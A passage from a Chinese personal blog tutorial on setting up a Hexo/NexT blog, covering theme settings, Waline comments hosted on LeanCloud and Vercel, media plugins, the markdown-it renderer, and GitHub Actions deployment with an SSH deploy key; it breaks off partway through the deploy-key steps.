<p><code>menu</code> 下还可以配置 <code>sub-menu</code>，其配置和 <code>menu</code> 类似，但是本站没必要配置这个，就不写了。</p>
<p>另外，在 <code>menu_settings</code> 还可以配置使用 <code>badges</code> 或者 <code>icons</code>。<code>badges: true</code> 会显示文章、类别和标签的数量。默认的 <code>icons: true</code> 会在 <code>menu</code> 项前显示图标。</p>
<h4 id="侧边栏">侧边栏</h4>
<p>博客中难免需要显示一些个人相关的社交平台联系链接。这些链接可以通过 <code>social</code> 配置项进行配置。它的格式与上述 menu 类似，但是指定的链接必须是绝对链接。</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">https://github.com/jasonren0403</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-github</span></span><br><span class="line">  <span class="attr">Twitter:</span> <span class="string">https://twitter.com/theRealRev270</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-twitter</span></span><br><span class="line">  <span class="attr">Facebook:</span> <span class="string">https://www.facebook.com/renjason1999/</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-facebook</span></span><br><span class="line">  <span class="attr">Instagram:</span> <span class="string">https://www.instagram.com/jasonren0403/</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-instagram</span></span><br></pre></td></tr></tbody></table></figure>
<p>通过 <code>social_icons</code> 配置项可以进行进一步配置，如是否启用（<code>enabled</code>）、是否只显示图标不显示描述（<code>icons_only</code>）、是否显示过渡动画（<code>transition</code>）等。</p>
<p>中国常见的社交平台对应的 Fontawesome 图标名称总结如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">社交平台名称</th>
<th style="text-align:center"> Fontawesome 图标名称</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">知乎</td>
<td style="text-align:center"> fab fa-zhihu</td>
</tr>
<tr>
<td style="text-align:center"> 微博</td>
<td style="text-align:center"> fab fa-weibo</td>
</tr>
<tr>
<td style="text-align:center"> 微信</td>
<td style="text-align:center"> fab fa-weixin</td>
</tr>
<tr>
<td style="text-align:center">QQ</td>
<td style="text-align:center">fab fa-qq</td>
</tr>
<tr>
<td style="text-align:center"> 抖音</td>
<td style="text-align:center"> fab fa-douyin</td>
</tr>
<tr>
<td style="text-align:center"> 人人</td>
<td style="text-align:center"> fab fa-renren</td>
</tr>
<tr>
<td style="text-align:center">B 站</td>
<td style="text-align:center"> fab fa-bilibili</td>
</tr>
</tbody>
</table>
<p>对于单个博客文章，<code>Table of Contents(TOC)</code> 是非常必要的，它可以显示你的文章的大致结构。可以通过 <code>toc</code> 配置项进行启用和禁用。我的配置如下：</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">expand_all:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">max_depth:</span> <span class="number">6</span></span><br></pre></td></tr></tbody></table></figure>
<p>侧边栏所展现的个人头像可以通过 <code>avatar</code> 来进行配置，NexT 主题还支持使用 <code>rounded</code> 属性设置圆形头像，<code>rotated</code> 属性支持鼠标悬停时旋转头像。</p>
<img data-src="/2023/04/03/works/how-i-built-the-blog/sidemenu.png" class="" title="侧边栏头像效果">
<h4 id="页脚">页脚</h4>
<p>以下配置需要在 <code>footer</code> 选项下进行配置。</p>
<h5 id="备案信息">备案信息</h5>
<p>众所周知，开在中国大陆的站点都需要备案，而备案信息是需要在页脚显示的。这里可以通过 <code>beian</code> 配置项进行配置，如下：</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">beian:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">icp:</span> <span class="string">京ICP备xxxxxxxx</span></span><br><span class="line">  <span class="attr">gongan_id:</span></span><br><span class="line">  <span class="attr">gongan_num:</span></span><br><span class="line">  <span class="attr">gongan_icon_url:</span></span><br></pre></td></tr></tbody></table></figure>
<h5 id="建站时间">建站时间</h5>
<p>一般建站的时候，总会往页脚加入开站时间，类似于 <code>2020-2023</code> 这样的。默认情况下，NexT 主题会显示当前年份，可以通过 <code>since</code> 配置项手动显示建站起始时间。</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="attr">since:</span> <span class="number">2020</span>  <span class="comment"># 年份，一般表示建站时间</span></span><br></pre></td></tr></tbody></table></figure>
<h5 id="页脚图标">页脚图标</h5>
<p>页脚图标会显示在年份和版权信息之间，往往是一个红心图标。可以通过 <code>icon</code> 选项做更多自定义配置，如修改图标名称、修改图标颜色、使图标动起来等。</p>
<h5 id="版权信息">版权信息</h5>
<p>版权信息显示在页脚图标右侧，由 <code>copyright</code> 配置中的内容指定，如果未指定，则使用 Hexo 配置文件中的 <code>author</code> 配置项。</p>
<h5 id="生成平台信息">生成平台信息</h5>
<p>在默认情况下，NexT 主题会在页脚显示 <code>Powered by Hexo &amp; Next.xxx</code>，表示生成器和主题，可以通过 <code>powered</code> 配置项进行更改。我觉得留着也没什么问题，就没改。</p>
<h3 id="域名配置">域名配置</h3>
<p>根据 <a href="https://docs.github.com/zh/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages">GitHub 相关配置文档</a>和 <a href="https://hexo.io/zh-cn/docs/github-pages.html">Hexo 文档</a>，需要在项目根目录下创建一个 <code>CNAME</code> 文件，里面写入你的域名，如 <code>example.com</code>。由于 hexo 部署时相当于把整个 source 文件夹复制到一个新的分支，故这个 <code>CNAME</code> 文件需要创建在 <code>source/</code> 文件夹下 <sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>。</p>
<img data-src="/2023/04/03/works/how-i-built-the-blog/cname.png" class="" title="项目结构及CNAME文件">
<p>在 Hexo 侧，需要在主配置文件<code>_config.yml</code> 中配合作这样的设置，以正确加载脚本及相关资源文件：</p>
<figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">url:</span> <span class="string">https://blog.jason0743.space/</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span></span><br></pre></td></tr></tbody></table></figure>
<p>其中 URL 项需要填写自己的自定义网址。我是使用了 blog 作为三级域名，所以在 URL 处填写的是整个网址，后面以斜杠 <code>/</code> 为结尾，而 root 就是网页的根目录。</p>
<p>如果今后需要将博客部署在子目录中（像 <code>https://example.com/child/</code> 这样），就需要在 url 中带上子目录，在 root 项填写带有两边斜杠的子目录名（对于 <code>https://example.com/child/</code> 这里就需要设置为 <code>/child/</code>）。</p>
<p>现代网页的地址末尾已经不一定需要 html 后缀了，甚至，主页的 <code>index</code> 字样我们也可以不需要（虽然实际上 Hexo 还是生成了它）。把这两个配置为 <code>false</code> 即可做到这一点。</p>
<figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">pretty_urls:</span></span><br><span class="line">  <span class="attr">trailing_index:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">trailing_html:</span> <span class="literal">false</span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="启用资源文件夹">启用资源文件夹</h3>
<p>我的博客项目中会有很多图片，把它们都放在 <code>source/images</code> 文件夹中则会显得非常拥挤且不好管理。Hexo 提供了一种资源文件夹的概念，它可以在创建的新文章同级目录自动创建一个同名文件夹，然后使用相对路径插件来引入这些资源。</p>
<p>在主配置文件 <code>_config.yml</code> 中，将这个选项设为 <code>true</code> 即可启用该功能。</p>
<figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure>
<p>撰写文章时，使用这个语法插入即可，其中 slug 处要填写文件名：</p>
<figure class="highlight markdown"><table><tbody><tr><td class="code"><pre><span class="line">{% asset<span class="emphasis">_path slug %}</span></span><br><span class="line"><span class="emphasis">{% asset_</span>img slug [title] %}</span><br><span class="line">{% asset<span class="emphasis">_link slug [title] %}</span></span><br></pre></td></tr></tbody></table></figure>
<h2 id="安装插件">安装插件</h2>
<h3 id="评论显示">评论显示</h3>
<p>静态站并没有 “后端” 这个概念，传统的评论系统该怎么实现呢？我们可以借助一些插件来实现。</p>
<p>我在这里的选择是 <a href="https://waline.js.org/">Waline</a>，比起之前的 Valine 来说，更加安全 <sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>，但配置起来需要一定时间。它需要同时考虑到 server 和 client 的部署问题。</p>
<div class="note info"><p>Waline 官方提供了<a href="https://waline.js.org/guide/get-started/">部署文档</a>，所有步骤跟随这个走就行。</p>
</div>
<h4 id="服务端配置">服务端配置</h4>
<div class="note info"><p>LeanCloud 注册当然要选<a href="https://leancloud.app/">国际版</a>，懂得都懂～</p>
</div>
<p>首先是 LeanCloud 端数据库的配置，注册账号和创建应用的过程就不赘述了（作为普通白嫖用户当然要选择开发版），然后到左侧的设置→应用凭证中，记下 AppID、AppKey 和 MasterKey，以后要用到。</p>
<img data-src="/2023/04/03/works/how-i-built-the-blog/leancloud-1.png" class="">
<p>接下来使用 <a href="https://vercel.com/">Vercel</a> 进行服务端部署，如果没有账户的话，可以直接使用 GitHub 账号登录。然后点击 Waline 文档中的 Vercel 部署按钮或<a href="https://github.com/walinejs/waline/tree/main/example">直接访问这个仓库</a>的 README.md 文件。</p>
<p>接下来会基于一个简单的模板创建 Git 仓库，作为 GitHub 常驻用户肯定时要选择 GitHub 的，如果有别的平台也可以点击别的平台按钮创建。</p>
<img data-src="/2023/04/03/works/how-i-built-the-blog/vercel-1.png" class="" title="选择仓库">
<p>项目创建成功后，进入到控制台中，从上方的 “Settings” 中进入项目设置，然后点击左侧的 “Environment Variables”，进入环境变量配置，建立三个环境变量 <code>LEAN_ID</code>、<code>LEAN_KEY</code>、<code>LEAN_MASTER_KEY</code>，分别对应上一步在 LeanCloud 获得的 AppID、AppKey 和 MasterKey。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2023/04/03/works/how-i-built-the-blog/vercel-2.png" class="" title="环境变量配置1"></div><div class="group-picture-column"><img data-src="/2023/04/03/works/how-i-built-the-blog/vercel-3.png" class="" title="环境变量配置2"></div></div></div>
<p>然后点击顶部的 “Deployments” 进入部署页面，选择最近一次部署，点击 “Redeploy“使得刚才的环境变量生效。部署好后就可以回到主页点击”Visit“访问服务端了。</p>
<img data-src="/2023/04/03/works/how-i-built-the-blog/vercel-4.png" class="" title="回到主页">
<p>其界面大致是这样的</p>
<img data-src="/2023/04/03/works/how-i-built-the-blog/vercel-5.png" class="" title="部署完毕">
<p>如果需要加入域名（vercel 默认域名实在有些丑），则依然需要进入设置页中，这次需要进入”Domains” 中，输入需要绑定的域名并点击 “Add” 添加域名，然后在服务商处加入 CNAME 解析记录，其值为 <code>cname.vercel-dns.com</code>，之后就可以用自己的域名来访问评论系统和管理端了。</p>
<img data-src="/2023/04/03/works/how-i-built-the-blog/vercel-6.png" class="">
<p>立即访问管理端（<code>&lt;url&gt;/ui/register</code>）进行注册，注册成功后，以后就可以通过 <code>&lt;url&gt;/ui</code> 管理评论了。</p>
<div class="note info"><p>这里最好通过账号绑定设置（<code>&lt;url&gt;/ui/profile</code>）到自己常用账户上，防止忘记登录凭证。</p>
</div>
<div class="note info"><p><code>&lt;url&gt;</code> 为 vercel 域名设置中所列出的域名，项目新建的默认值一般为 <code>&lt;project-name&gt;.vercel.app</code></p>
</div>
<img data-src="/2023/04/03/works/how-i-built-the-blog/management.png" class="" title="管理界面">
<h4 id="客户端配置">客户端配置</h4>
<p>客户端需要进行样式导入和代码注入，对于 hexo-next 来说，像下面这样安装<a href="https://www.npmjs.com/package/@waline/hexo-next">插件</a>并加以配置即可。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">npm install @waline/hexo-next</span><br></pre></td></tr></tbody></table></figure>
<p>然后在主题配置文件 <code>_config.next.yml</code> 中加入以下内容：</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">waline:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">serverURL:</span> </span><br><span class="line">  <span class="attr">libUrl:</span></span><br><span class="line">  <span class="attr">cssUrl:</span></span><br><span class="line">  <span class="attr">locale:</span></span><br><span class="line">    <span class="attr">placeholder:</span> </span><br><span class="line">  <span class="attr">commentCount:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">pageview:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">emoji:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://unpkg.com/@waline/emojis@1.0.1/weibo</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://unpkg.com/@waline/emojis@1.0.1/alus</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://unpkg.com/@waline/emojis@1.0.1/bilibili</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://unpkg.com/@waline/emojis@1.0.1/qq</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://unpkg.com/@waline/emojis@1.0.1/tieba</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://unpkg.com/@waline/emojis@1.0.1/tw-emoji</span></span><br><span class="line">  <span class="attr">meta:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">nick</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">mail</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">link</span></span><br><span class="line">  <span class="attr">requiredMeta:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">nick</span></span><br><span class="line">  <span class="attr">lang:</span> <span class="string">zh-CN</span>	</span><br><span class="line">  <span class="attr">wordLimit:</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">login:</span> <span class="string">enable</span></span><br><span class="line">  <span class="attr">pageSize:</span> <span class="number">10</span></span><br></pre></td></tr></tbody></table></figure>
<p>首先当然要启用该插件（<code>enable:true</code>）。然后需要设置 <code>serverURL</code> 为刚才部署的服务端地址，如果使用了自定义域名的话，这里就需要填写自定义域名。语言当然设置为 <code>zh-CN</code>，我也启用了 <code>pageview</code> 和 <code>commentCount</code> 两个功能，显示文章的阅读统计和评论数量，配置效果如下：</p>
<img data-src="/2023/04/03/works/how-i-built-the-blog/comment.png" class="" title="评论区效果">
<h3 id="视频-音乐嵌入">视频 / 音乐嵌入</h3>
<p>博客如果只有静态的文字和图片的话，也未免太单调了吧！如果能适时地嵌入一些其他网站或自己上传的资源，就更好了。我选择的是 <a href="https://www.u2sb.com/OpenSw/hexo-tag-mmedia/install.html">mmedia</a> 插件，因为它目前支持较广，而且使用也比较方便。</p>
<p>针对 hexo，只需要安装 <a href="https://www.npmjs.com/package/hexo-tag-mmedia">hexo-tag-mmedia</a> 插件即可，安装方法如下：</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">npm install hexo-tag-mmedia --save</span><br></pre></td></tr></tbody></table></figure>
<p>然后在 <code>_config.yml</code> 下采用作者推荐的默认设置即可：</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">mmedia:</span></span><br><span class="line">  <span class="attr">audio:</span></span><br><span class="line">    <span class="attr">default:</span></span><br><span class="line">  <span class="attr">video:</span></span><br><span class="line">    <span class="attr">default:</span></span><br><span class="line">  <span class="attr">aplayer:</span></span><br><span class="line">    <span class="attr">js:</span> <span class="string">https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.js</span></span><br><span class="line">    <span class="attr">css:</span> <span class="string">https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.css</span></span><br><span class="line">    <span class="attr">default:</span></span><br><span class="line">      <span class="attr">contents:</span></span><br><span class="line">  <span class="attr">meting:</span></span><br><span class="line">    <span class="attr">js:</span> <span class="string">https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js</span></span><br><span class="line">    <span class="attr">api:</span></span><br><span class="line">    <span class="attr">default:</span></span><br><span class="line">  <span class="attr">dplayer:</span></span><br><span class="line">    <span class="attr">js:</span> <span class="string">https://cdn.jsdelivr.net/npm/dplayer@1/dist/DPlayer.min.js</span></span><br><span class="line">    <span class="attr">hls_js:</span> <span class="string">https://cdn.jsdelivr.net/npm/hls.js/dist/hls.min.js</span></span><br><span class="line">    <span class="attr">dash_js:</span> <span class="string">https://cdn.jsdelivr.net/npm/dashjs/dist/dash.all.min.js</span></span><br><span class="line">    <span class="attr">shaka_dash_js:</span> <span class="string">https://cdn.jsdelivr.net/npm/shaka-player/dist/shaka-player.compiled.js</span></span><br><span class="line">    <span class="attr">flv_js:</span> <span class="string">https://cdn.jsdelivr.net/npm/flv.js/dist/flv.min.js</span></span><br><span class="line">    <span class="attr">webtorrent_js:</span> <span class="string">https://cdn.jsdelivr.net/npm/webtorrent/webtorrent.min.js</span></span><br><span class="line">    <span class="attr">default:</span></span><br><span class="line">      <span class="attr">contents:</span></span><br><span class="line">  <span class="attr">bilibili:</span></span><br><span class="line">    <span class="attr">default:</span></span><br><span class="line">      <span class="attr">page:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">danmaku:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">allowfullscreen:</span> <span class="string">allowfullscreen</span></span><br><span class="line">      <span class="attr">sandbox:</span> <span class="string">allow-top-navigation</span> <span class="string">allow-same-origin</span> <span class="string">allow-forms</span> <span class="string">allow-scripts</span> <span class="string">allow-popups</span></span><br><span class="line">      <span class="attr">width:</span> <span class="number">100</span><span class="string">%</span></span><br><span class="line">      <span class="attr">max_width:</span> <span class="string">850px</span></span><br><span class="line">      <span class="attr">margin:</span> <span class="string">auto</span></span><br><span class="line">  <span class="attr">xigua:</span></span><br><span class="line">    <span class="attr">default:</span></span><br><span class="line">      <span class="attr">autoplay:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">startTime:</span> <span class="number">0</span></span><br><span class="line">      <span class="attr">allowfullscreen:</span> <span class="string">allowfullscreen</span></span><br><span class="line">      <span class="attr">sandbox:</span> <span class="string">allow-top-navigation</span> <span class="string">allow-same-origin</span> <span class="string">allow-forms</span> <span class="string">allow-scripts</span> <span class="string">allow-popups</span></span><br><span class="line">      <span class="attr">width:</span> <span class="number">100</span><span class="string">%</span></span><br><span class="line">      <span class="attr">max_width:</span> <span class="string">850px</span></span><br><span class="line">      <span class="attr">margin:</span> <span class="string">auto</span></span><br></pre></td></tr></tbody></table></figure>
<p>在使用上，假如要嵌入一个 B 站的视频，只需要使用这个简单语法：</p>
<figure class="highlight markdown"><table><tbody><tr><td class="code"><pre><span class="line">{% mmedia "bilibili" "bvid:BV<span class="language-xml"><span class="tag">&lt;<span class="name">xxxxx</span>&gt;</span></span>" %}</span><br></pre></td></tr></tbody></table></figure>
<p>即可，其中第一个参数是要引用的视频网站名称，第二个参数是要引用的视频 id，以冒号或者等号分隔都可以。</p>
<p>如果要嵌入音乐播放列表，则需要采用其中的 MetingJS 标签形式，采用的参数可以在<a href="https://github.com/metowolf/MetingJS">这里</a>了解。</p>
<figure class="highlight markdown"><table><tbody><tr><td class="code"><pre><span class="line">{% mmedia "meting" "server=<span class="language-xml">&lt;netease|tencent|kugou|xiami|baidu&gt;</span>" "type=<span class="language-xml">&lt;song|playlist|album|search|artist&gt;</span>" %}</span><br></pre></td></tr></tbody></table></figure>
<p>其支持的平台其实已经能够涵盖常见的用途了。如果以上几种不够用，还有最后的 Audio 和 Video 参数打底，它可以支持上传自有资源，插入原生的标签。</p>
<div class="note warning"><p>不过<a href="https://github.com/u2sb/hexo-tag-mmedia/issues/23">这个插件的原作者说他要弃坑了</a>，保证稳定性的话，还是最好找个替代品，或者自己二次封装一下比较合适。</p>
</div>
<h3 id="Markdown渲染器配置">Markdown 渲染器配置</h3>
<p>Hexo 默认搭配的渲染器是 <code>hexo-renderer-marked</code>，其支持的渲染格式有限，所以我重新使用了 <code>hexo-renderer-markdown-it</code>，它支持更多的解析和渲染格式，如 GFM 和 Commonmark 等，还支持插件。</p>
<p>在安装它之前，需要卸载 Hexo 默认自带的渲染器。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br></pre></td></tr></tbody></table></figure>
<p>然后再安装 <code>hexo-renderer-markdown-it</code>。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">npm install hexo-renderer-markdown-it --save</span><br></pre></td></tr></tbody></table></figure>
<p>它的配置在 <code>_config.yml</code> 中，直接使用默认的简单配置即可。</p>
<figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">markdown:</span></span><br><span class="line">  <span class="attr">preset:</span> <span class="string">'default'</span></span><br><span class="line">  <span class="attr">render:</span></span><br><span class="line">    <span class="attr">html:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">xhtmlOut:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">langPrefix:</span> <span class="string">'language-'</span></span><br><span class="line">    <span class="attr">breaks:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">linkify:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">typographer:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">quotes:</span> <span class="string">'“”‘’'</span></span><br><span class="line">  <span class="attr">enable_rules:</span></span><br><span class="line">  <span class="attr">disable_rules:</span></span><br><span class="line">  <span class="attr">plugins:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-abbr</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-footnote</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-ins</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-sub</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-sup</span></span><br><span class="line">  <span class="attr">anchors:</span></span><br><span class="line">    <span class="attr">level:</span> <span class="number">2</span></span><br><span class="line">    <span class="attr">collisionSuffix:</span> <span class="string">''</span></span><br><span class="line">    <span class="attr">permalink:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">permalinkClass:</span> <span class="string">'header-anchor'</span></span><br><span class="line">    <span class="attr">permalinkSide:</span> <span class="string">'left'</span></span><br><span class="line">    <span class="attr">permalinkSymbol:</span> <span class="string">'¶'</span></span><br><span class="line">    <span class="attr">case:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">separator:</span> <span class="string">'-'</span></span><br></pre></td></tr></tbody></table></figure>
<p>其实我最需要的是脚注（<code>markdown-it-footnote</code>）功能，这个语法可以用来写一些参考文献，或者是一些引用的资料。</p>
<h2 id="部署到GitHub">部署到 GitHub</h2>
<p>由于将博客放到云服务器上操作过程过于繁琐（万一域名失效了还得四处拷贝搬运，并且配置域名 HTTPS 啥的也是不少麻烦），我选择使用 GitHub Pages 功能来托管我的内容。GitHub Pages 是 GitHub 提供的一个静态网页托管服务，可以将静态网页托管到 GitHub 上，然后通过 <code>username.github.io</code> 的形式来访问。这样做的好处是，我可以将博客的源码和静态网页内容分开，而且可以通过 GitHub Actions 来实现自动化部署。</p>
<h3 id="建立仓库">建立仓库</h3>
<p>在 GitHub 上建立一个新的仓库，并做好初始化，稍后我们会将博客的源码推送到这个仓库上。</p>
<p>本地的博客文件夹中，现在应该已经是这样的结构：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">+--+</span><br><span class="line">   |---scaffolds</span><br><span class="line">      |---draft.md</span><br><span class="line">      |---page.md</span><br><span class="line">      |---post.md</span><br><span class="line">   |---source</span><br><span class="line">      |---_drafts</span><br><span class="line">      |</span><br><span class="line">      |---_posts</span><br><span class="line">      |</span><br><span class="line">      |---categories</span><br><span class="line">           |---index.md</span><br><span class="line">      |---tags</span><br><span class="line">           |---index.md</span><br><span class="line">      |---CNAME</span><br><span class="line">   |---_config.next.yml</span><br><span class="line">   |---_config.yml</span><br><span class="line">   |---package.json</span><br><span class="line">   |---package-lock.json</span><br><span class="line">   |....</span><br></pre></td></tr></tbody></table></figure>
<p>在这个文件夹下运行 <code>git init</code>，之后再把这个分支推送到仓库中。</p>
<p>目前，我的博客全部源码内容都在 <code>main</code> 分支上，而博客的静态网页内容则在 <code>gh-pages</code> 分支上。这样做的好处是，我可以在 <code>main</code> 分支上进行博客的编辑和维护，而 <code>gh-pages</code> 分支则可以作为一个单独的静态网页仓库，用于部署到 GitHub Pages 上。</p>
<h3 id="使用GitHub-Actions全自动化部署过程">使用 GitHub Actions 全自动化部署过程</h3>
<p>Hexo 本身其实也有提供 deploy 命令用于部署仓库，但是这个命令每次都要手动执行，稍微有点不太方便。故我选择了尝试使用 GitHub Actions 来实现自动化部署。</p>
<p>GitHub Actions 是处于 git 仓库中 <code>.github/workflows</code> 文件夹下的一个 yml 配置文件。其记载了在什么样的条件下，自动执行什么样的操作。</p>
<p>我们的文件是这样的：</p>
<figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">publish-webpage</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">main</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">publish-webpage:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">if:</span> <span class="string">github.event.repository.owner.id</span> <span class="string">==</span> <span class="string">github.event.sender.id</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">source</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">ref:</span> <span class="string">main</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">Node.js</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="number">16</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">Hexo</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">ACTION_DEPLOY_KEY:</span> <span class="string">${{</span> <span class="string">secrets.HEXO_DEPLOY_KEY</span> <span class="string">}}</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          mkdir -p ~/.ssh/</span></span><br><span class="line"><span class="string">          echo "$ACTION_DEPLOY_KEY" &gt; ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">          chmod 700 ~/.ssh</span></span><br><span class="line"><span class="string">          chmod 600 ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">          ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts</span></span><br><span class="line"><span class="string">          git config --global user.email "40999116+jasonren0403@users.noreply.github.com"</span></span><br><span class="line"><span class="string">          git config --global user.name "Jason Ren"</span></span><br><span class="line"><span class="string">          npm install hexo-cli -g</span></span><br><span class="line"><span class="string">          npm install</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Build</span> <span class="string">and</span> <span class="string">Deploy</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          hexo clean</span></span><br><span class="line"><span class="string">          hexo generate</span></span><br><span class="line"><span class="string">          hexo deploy</span></span><br></pre></td></tr></tbody></table></figure>
<p>注意，这些代码与 <a href="https://hexo.io/zh-cn/docs/github-pages">hexo 文档</a>上的部署代码并不一样，主要的不同点在于官方教程使用了 <code>actions-gh-pages</code>，而自己这边使用的是 git 原生命令来自己建一个部署密钥。</p>
<div class="note "><p>其实个人认为官方这个代码是比较好的，因为其所使用的 <code>actions-gh-pages</code> 无需担心部署密钥，<code>github_token</code> 是可以自动在工作流中认证的，不是个人访问令牌，除了首次部署外，无需特别配置。</p>
<p>而且，它还注意了 npm 依赖的缓存，以后要是再次部署的话，无需再费很长时间安装依赖，博客上线速度可以大大加快。</p>
</div>
<p>生成 deploy key 的过程如下：</p>
<h4 id="生成Deploy-key">生成 Deploy key</h4>
<ol>
<li>
<p>在本地运行 <code>ssh-keygen -t rsa -b 4096 -C "Hexo Deploy Key" -f github-deploy-key -N ""</code> 生成一个新的密钥对。</p>
 <img data-src="/2023/04/03/works/how-i-built-the-blog/gen-key-1.png" class="">
</li>
<li>
<p>在仓库的设置选项卡中，选择 “Secrets”（现为 “Secrets and variables”），新建名称为 “HEXO_DEPLOY_KEY”（这个名称是与刚才工作流配置文件中的 <code>secrets.*</code> 后面的内容是对应的）的密钥，将刚刚生成的公钥对应的私钥的内容复制进去。</p>
 <img data-src="/2023/04/03/works/how-i-built-the-blog/gen-key-0.png" class="">
<p>配置完成后，Action Secrets 列表（现 Actions Secrets and variables 中的 Repository secrets）中应该会出现一个新的密钥。</p>
 <img data-src="/2023/04/03/works/how-i-built-the-blog/gen-key-2.png" class="">
</li>
<li>
<p>转到 “Deploy Keys” 中，右上角新添加一个部署密钥。</p>
 <img data-src="/2023/04/03/works/how-i-built-the-blog/gen-key-3.png" class="">
</li>
<li>
